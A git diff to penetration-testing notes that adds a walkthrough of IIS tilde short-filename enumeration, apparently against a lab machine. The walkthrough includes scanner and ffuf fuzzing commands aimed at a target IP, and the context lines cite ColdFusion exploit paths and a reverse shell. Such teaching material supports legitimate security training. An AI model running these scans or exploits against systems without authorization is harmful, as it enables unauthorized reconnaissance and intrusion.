@@ -41,6 +41,8 @@ This document outlines common techniques for identifying and exploiting vulnerab
   - [Miscellaneous Applications](#miscellaneous-applications)
     - [Cold Fusion - Discovery and Enumeration](#cold-fusion---discovery-and-enumeration)
     - [Attacking ColdFusion](#attacking-coldfusion)
+    - [IIS Tilde Enumeration](#iis-tilde-enumeration)
+    - [Attacking LDAP](#attacking-ldap)
 
 
 ---
@@ -1900,9 +1902,9 @@ searchsploit adobe coldfusion
 The results reveal several relevant exploits. Two stand out as particularly useful:
 
 - Adobe ColdFusion - Directory Traversal
-  - multiple/remote/14641.py
+  - `multiple/remote/14641.py`
 - Adobe ColdFusion 8 - Remote Command Execution (RCE)
-  - cfm/webapps/50057.py
+  - `cfm/webapps/50057.py`
 
 [CVE-2010-2861](https://nvd.nist.gov/vuln/detail/cve-2010-2861), is a directory traversal flaw in ColdFusion that allows an unauthenticated attacker to read arbitrary files on the system.
 
@@ -1975,3 +1977,113 @@ A reverse shell is successfully established:
 ![Filtered output](images/coldfusion9.PNG)
 
 ---
+
+### IIS Tilde Enumeration
+
+Certain versions of **Microsoft Internet Information Services (IIS)** are vulnerable to **tilde (~) directory enumeration**, a technique that can be used to discover hidden files, directories, and short filenames on a web server.
+
+When files or directories are created on Windows systems, an additional `8.3` short filename is automatically generated for backward compatibility. This format consists of:
+
+- Up to 8 characters for the filename
+- A period (.)
+- Up to 3 characters for the file extension
+
+For example:
+
+```
+SecretDocuments  →  SECRET~1
+```
+
+Even if access to the long filename is restricted, IIS may still respond differently when short filenames are referenced, unintentionally leaking information about hidden resources.
+
+The tilde character (~) followed by a sequence number is used to reference short filenames in URLs. By observing differences in HTTP responses, an attacker can infer whether a file or directory exists.
+
+Enumeration typically begins by testing single-character prefixes:
+
+```
+http://example.com/~a
+http://example.com/~b
+http://example.com/~c
+```
+
+Assume the server contains a hidden directory named `SecretDocuments`. If a request to the following URL returns 200 OK:
+
+```
+http://example.com/~s
+```
+
+This indicates that a file or directory beginning with `s` exists. The enumeration process continues by appending additional characters:
+
+```
+http://example.com/~se
+http://example.com/~sf
+http://example.com/~sg
+```
+
+This process can be repeated to progressively identify the full short filename.
+
+Manual enumeration is inefficient, so this technique is typically automated using `IIS-ShortName-Scanner`, available from the following GitHub repository:
+
+```
+https://github.com/irsdl/IIS-ShortName-Scanner
+```
+
+The tool requires **Oracle Java** to be installed.
+
+Clone the repository:
+
+```bash
+git clone https://github.com/irsdl/IIS-ShortName-Scanner.git
+```
+
+Navigate to the `release` directory and execute the scanner:
+
+```bash
+java -jar iis_shortname_scanner.jar 0 5 http://10.129.67.51/
+```
+
+![Filtered output](images/iis.PNG)
+
+The scan confirms that the target is vulnerable to **IIS Tilde Enumeration** and reveals the following short filenames:
+
+Directories:
+
+- `ASPNET~1`
+- `UPLOAD~1`
+
+Files:
+
+- `CSASPX~1.CS`
+- `TRANSF~1.ASP`
+
+Direct access to the short filename fails:
+
+```
+http://10.129.67.51/TRANSF~1.ASP
+```
+
+Since IIS blocks direct `GET` access, we must brute-force the long filename corresponding to `TRANSF~1`.
+
+We create a custom wordlist containing filenames that start with `transf` by extracting entries from multiple wordlists:
+
+```bash
+egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > list.txt
+```
+
+Using the custom wordlist, we fuzz for matching `.asp` and `.aspx` files:
+
+```bash
+ffuf -w list.txt:FUZZ -u http://10.129.67.51/FUZZ -e .aspx,.asp
+```
+
+The fuzzing process identifies a valid file:
+
+```
+transfer.aspx
+```
+
+![Filtered output](images/iis2.PNG)
+
+---
+
+### Attacking LDAP
